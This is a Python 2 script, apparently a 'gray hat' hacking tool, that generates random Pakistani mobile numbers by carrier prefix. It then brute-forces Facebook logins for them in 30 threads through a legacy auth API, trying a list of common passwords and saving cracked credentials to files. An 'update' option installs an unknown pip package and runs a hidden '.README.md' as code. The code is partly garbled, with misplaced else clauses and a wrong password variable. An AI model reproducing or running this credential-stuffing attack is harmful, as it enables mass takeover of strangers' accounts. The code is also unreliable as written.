import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### Dev : Arbab Ali Memon#####
##### LOGO #####
logo='''
\x1b[1;96m____________________██████
\x1b[1;97m_________▓▓▓▓____█████████
\x1b[1;95m__ Ƹ̵̡Ӝ̵̨̄Ʒ▓▓▓▓▓=▓____▓=▓▓▓▓▓
\x1b[1;94m__ ▓▓▓_▓▓▓▓░●____●░░▓▓▓▓
\x1b[1;91m_▓▓▓▓_▓▓▓▓▓░░__░░░░▓▓▓▓
\x1b[1;97m_ ▓▓▓▓_▓▓▓▓░░♥__♥░░░▓▓▓
\033[1;97m__ ▓▓▓___▓▓░░_____░░░▓▓
\x1b[1;96m▓▓▓▓▓____▓░░_____░░▓
\x1b[1;97m_ ▓▓____ ▒▓▒▓▒___ ████
\x1b[1;95m_______ ▒▓▒▓▒▓▒_ ██████
\x1b[1;91m_______▒▓▒▓▒▓▒ ████████
\x1b[1;97m_____ ▒▓▒▓▒▓▒_██████ ███
\033[1;97m_ ___▒▓▒▓▒▓▒__██████ _███
\x1b[1;96m_▓▓X▓▓▓▓▓▓▓__██████_ ███
\x1b[1;97m▓▓_██████▓▓__██████_ ███
\x1b[1;91m▓_███████▓▓__██████_ ███
\x1b[1;96m_████████▓▓__██████ _███
\x1b[1;97m_████████▓▓__▓▓▓▓▓▓_▒▒
\x1b[1;96m_████████▓▓__▓▓▓▓▓▓
\x1b[1;95m_████████▓▓__▓▓▓▓▓▓
\x1b[1;91m__████████▓___▓▓▓▓▓▓
\x1b[1;94m_______▒▒▒▒▒____▓▓▓▓▓▓
\x1b[1;96m_______▒▒▒▒▒ _____▓▓▓▓▓
\x1b[1;97m_______▒▒▒▒▒_____ ▓▓▓▓▓
\x1b[1;95m_______▒▒▒▒▒ _____▓▓▓▓▓
\x1b[1;94m________▒▒▒▒______▓▓▓▓▓
\x1b[1;97m________█████____█████
\x1b[1;96m_'▀█║────────────▄▄───────────​─▄──▄_
\x1b[1;97m──█║───────▄─▄─█▄▄█║──────▄▄──​█║─█║
\x1b[1;95m──█║───▄▄──█║█║█║─▄║▄──▄║█║─█║​█║▄█║
\x1b[1;94m──█║──█║─█║█║█║─▀▀──█║─█║█║─█║​─▀─▀
\x1b[1;97m──█║▄║█║─█║─▀───────█║▄█║─▀▀
\x1b[1;96m──▀▀▀──▀▀────────────▀─█║
\x1b[1;97m───────▄▄─▄▄▀▀▄▀▀▄──▀▄▄▀
\x1b[1;95m──────███████───▄▀
\x1b[1;94m──────▀█████▀▀▄▀
\x1b[1;91m────────▀█▀
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣  Name : Farooq Ansari
\x1b[1;91m➣  Whatsapp Group : Gray Hat Hacker
\x1b[1;93m➣  Note     : Plz Don,t Call Me Only Text msg
\x1b[1;95m➣  Warning  : If not work then use free vpn
\x1b[1;96m➣  Whatsapp : +92132197796
\x1b[1;97m➣  Note     : Don,t edit my script
\x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
\x1b[1;93m--------------------------------------------------------------"""
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;92mGRAY-HAT -HACKER-Wellcome"
	print
        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
	print "\033[1;92m[1]  MOBILINK"
	print "\033[1;92m[2]  TELINOR"
	print "\033[1;92m[3]  WARID"
	print "\033[1;92m[4]  UFONE"
	print "\033[1;92m[5]  ZONG"
	print "\033[1;92m[6]  UPDATE SYSTEM"
	print "\033[1;92m[0]  EXIT_KALTI MAR"	    
	print 50*'-'
	action()
	
def action():	
	bch = raw_input('\n  ENTER HERE ANY NUMBER ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
		print "\033[1;95m00, 01, 02, 03, 04,"
		print "\033[1;95m05, 06, 07, 08, 09,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print (logo)
		print "\033[1;91mTELINORE CODE HERE"		
		print "\033[1;94m40, 41, 42, 43, 44,"
		print "\033[1;95m45, 64, ??, ??, ??,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print (logo)
		print "\033[1;91mWARID CODE HERE"		
		print "\033[1;94m20, 21, 22, 23,"
		print "\033[1;95m24, ??, ??, ??,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":			
		os.system("clear")
		print (logo)
		print "\033[1;91mUFONE CODE HERE"		
		print "\033[1;94m31, 32, 33, 34,"
		print "\033[1;95m35, 36, 37, ??,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="5":			
		os.system("clear")
		print (logo)
		print "\033[1;91mZONG CODE HERE"		
		print "\033[1;94m10, 11, 12, 13,"
		print "\033[1;95m14, 15, 16, 17,"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .README.md")
#	elif chb =='3':	
#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
#	    time.sleep(1)
#	    menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[✓] Total Numbers: '+xxx)
	time.sleep(0.5)
	psb ('[✓] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[✓] Last 07 Digit Crack,and 16 comman password Found ...')
	time.sleep(0.5)
	psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;91mARBAB-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:	
					pass2 = 'Pakistan'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:	
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:	
							pass3 = '786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
									else:	
							pass4 = '786000'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass4+'\n')
								okb.close()
								oks.append(c+user+pass4)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass4+'\n')
									cps.close()
									cpb.append(c+user+pass4)
									else:	
							pass5 = '000786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass5+'\n')
								okb.close()
								oks.append(c+user+pass5)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass5+'\n')
									cps.close()
									cpb.append(c+user+pass5)
									else:	
							pass6 = '123456'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass6+'\n')
								okb.close()
								oks.append(c+user+pass6)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass6+'\n')
									cps.close()
									cpb.append(c+user+pass6)
									else:	
							pass7 = '1234567890'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass7+'\n')
								okb.close()
								oks.append(c+user+pass7)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass7+'\n')
									cps.close()
									cpb.append(c+user+pass7)
									else:	
							pass8 = '112233'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass8+'\n')
								okb.close()
								oks.append(c+user+pass8)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass8+'\n')
									cps.close()
									cpb.append(c+user+pass8)
									else:	
							pass9 = '123123'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass9+'\n')
								okb.close()
								oks.append(c+user+pass9)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass9+'\n')
									cps.close()
									cpb.append(c+user+pass9)
									else:	
							pass10 = 'pakistan123'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass10+'\n')
								okb.close()
								oks.append(c+user+pass10)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass10+'\n')
									cps.close()
									cpb.append(c+user+pass10)
									else:	
							pass11 = 'pakistan786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass11
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass11+'\n')
								okb.close()
								oks.append(c+user+pass11)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass11
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass11+'\n')
									cps.close()
									cpb.append(c+user+pass11)
									else:	
							pass12 = 'karachi123'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass12
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass12+'\n')
								okb.close()
								oks.append(c+user+pass12)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass12
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass12+'\n')
									cps.close()
									cpb.append(c+user+pass12)
									else:	
							pass13 = '786786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass13
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass13+'\n')
								okb.close()
								oks.append(c+user+pass13)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass13
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass13+'\n')
									cps.close()
									cpb.append(c+user+pass13)
									else:	
							pass14 = '123123123'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass14
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass14+'\n')
								okb.close()
								oks.append(c+user+pass14)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass14
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass14+'\n')
									cps.close()
									cpb.append(c+user+pass14)
									else:	
							pass15 = 'karachi786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass15
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass15+'\n')
								okb.close()
								oks.append(c+user+pass15)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass15
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass15+'\n')
									cps.close()
									cpb.append(c+user+pass15)
									else:	
							pass16 = '123abc'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass16
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass16+'\n')
								okb.close()
								oks.append(c+user+pass16)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass16
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass16+'\n')
									cps.close()
									cpb.append(c+user+pass16)
									
								
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()

